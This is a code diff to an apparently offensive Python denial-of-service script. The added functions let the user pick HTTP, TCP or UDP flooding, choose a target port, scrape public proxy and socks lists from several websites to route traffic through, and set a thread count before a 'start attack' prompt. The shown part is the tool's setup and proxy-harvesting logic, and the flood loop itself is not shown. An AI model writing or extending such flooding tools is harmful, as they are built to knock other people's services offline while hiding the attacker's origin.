@@ -45,6 +45,187 @@ print (" ")
 time.sleep(5)
 sent = 0
 
+def floodmode():
+	global choice1
+	choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
+	if choice1 == "0":
+		proxymode()
+	elif choice1 == "1":
+		try:
+			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
+				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
+				exit(0) # e esce
+			else: # altrimenti
+				floodport() # continua
+		except:
+			pass
+	elif choice1 == "2":
+		try:
+			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
+				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
+				exit(0) # e esce
+			else: # altrimenti
+				floodport() # continua
+		except:
+			pass
+	else:
+		print ("You mistyped, try again.")
+		floodmode()
+
+def floodport():
+	global port
+	try:
+		port = int(input("Enter the port you want to flood: "))
+		portlist = range(65535) # range di tutte le porte informatiche
+		if port in portlist: # se la porta selezionata rientra nel range
+			pass # continua
+		else: # altrimenti
+			print ("You mistyped, try again.")
+			floodport() # riparte la funzione e ti fa riscrivere
+	except ValueError: # se da' errore di valore
+		print ("You mistyped, try again.") # printa questo e
+		floodport() # riparte la funzione e ti fa riscrivere
+	proxymode()
+
+def proxymode():
+	global choice2
+	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
+	if choice2 == "y":
+		choiceproxysocks()
+	else:
+		numthreads()
+
+def choiceproxysocks():
+	global choice3
+	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
+	if choice3 == "0":
+		choicedownproxy()
+	elif choice3 == "1":
+		choicedownsocks()
+	else:
+		print ("You mistyped, try again.")
+		choiceproxysocks()
+
+def choicedownproxy():
+	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
+	if choice4 == "y":
+		choicemirror1()
+	else:
+		proxylist()
+
+def choicedownsocks():
+	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
+	if choice4 == "y":
+		choicemirror2()
+	else:
+		proxylist()
+
+def choicemirror1():
+	global urlproxy
+	choice5 = input ("Download from: free-proxy-list.net='0'(best) or inforge.net='1' ")
+	if choice5 == "0":
+		urlproxy = "http://free-proxy-list.net/"
+		proxyget1()
+	elif choice5 == "1":
+		inforgeget()
+	else:
+		print("You mistyped, try again.")
+		choicemirror1()
+
+def choicemirror2():
+	global urlproxy
+	choice5 = input ("Download from: socks-proxy.net='0'(best) or inforge.net='1' ")
+	if choice5 == "0":
+		urlproxy = "https://www.socks-proxy.net/"
+		proxyget1()
+	elif choice5 == "1":
+		inforgeget()
+	else:
+		print("You mistyped, try again.")
+		choicemirror2()
+
+def proxyget1(): # lo dice il nome, questa funzione scarica i proxies
+	try:
+		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
+		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
+		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
+		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
+		part = part.split("<tbody>")
+		part = part[1].split("</tbody>")
+		part = part[0].split("<tr><td>")
+		proxies = ""
+		for proxy in part:
+			proxy = proxy.split("</td><td>")
+			try:
+				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+			except:
+				pass
+		out_file = open("proxy.txt","w")
+		out_file.write("")
+		out_file.write(proxies)
+		out_file.close()
+		print ("Proxies downloaded successfully.")
+	except: # se succede qualche casino
+		print ("\nERROR!\n")
+	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()
+
+def inforgeget(): # anche questa funzione scarica proxy pero' da inforge.net
+	try:
+		if os.path.isfile("proxy.txt"):
+			out_file = open("proxy.txt","w") # cancella tutto il contenuto
+			out_file.write("")               # di proxy.txt
+			out_file.close()
+		else:
+			pass
+		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
+		soup = BeautifulSoup(urllib.request.urlopen(url)) # per strasformare in "zuppa" la source del sito
+		print ("\nDownloading from inforge.net in progress...")
+		base = "https://www.inforge.net/xi/"                       # questi comandi servono per trovare i link nella sezione
+		for tag in soup.find_all("a", {"class":"PreviewTooltip"}): # liste-proxy del forum
+			links = tag.get("href")                                #
+			final = base + links                                   # composizione links
+			result = urllib.request.urlopen(final)                 # finalmente apre i link trovati
+			for line in result :
+				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca gli ip:porta nelle pagine
+				if ip: # se ha trovato gli ip prosegue
+					for x in ip:
+						out_file = open("proxy.txt","a") # scrittura singolo ip nella proxy.txt
+						while True:
+							out_file.write(x+"\n")
+							out_file.close()
+							break # il ciclo si ferma non appena ha finito
+		print ("Proxies downloaded successfully.") # se li scarica correttamente, printa questa scritta
+	except: # se qualcosa va storto
+		print ("\nERROR!\n") # printa qua
+	proxylist() # se tutto e' andato a buon fine, prosegue eseguendo proxylist()
+
+def proxylist():
+	global proxies
+	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
+	if out_file == "":
+		out_file = "proxy.txt"
+	proxies = open(out_file).readlines()
+	numthreads()
+
+def numthreads():
+	global threads
+	try:
+		threads = int(input("Insert number of threads (800): "))
+	except ValueError:
+		threads = 800
+		print ("800 threads selected.\n")
+	multiplication()
+
+def begin():
+	choice6 = input("Press 'Enter' to start attack: ")
+	if choice6 == "":
+		loop()
+	elif choice6 == "Enter": #lool
+		loop()
+	elif choice6 == "enter": #loool
+		loop()
+	else:
+		exit(0)
 
 def user_agent():
 	global uagent
